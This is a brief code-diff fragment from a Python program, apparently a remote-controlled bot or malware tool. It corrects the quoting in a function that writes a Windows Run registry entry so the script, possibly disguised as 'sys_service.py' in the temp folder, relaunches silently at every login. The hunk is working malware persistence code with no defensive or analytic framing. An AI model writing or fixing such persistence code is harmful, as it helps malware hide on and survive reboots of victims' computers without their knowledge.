@@ -860,7 +860,7 @@ async def persist_reg(ctx):
     try:
         exe = sys.executable
         script = os.path.abspath(__file__) if "__file__" in dir() else os.path.join(tempfile.gettempdir(), "sys_service.py")
-        value = f'\"{exe}\" -W ignore \"{script}"\'
+        value = f'"{exe}" -W ignore "{script}"'
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
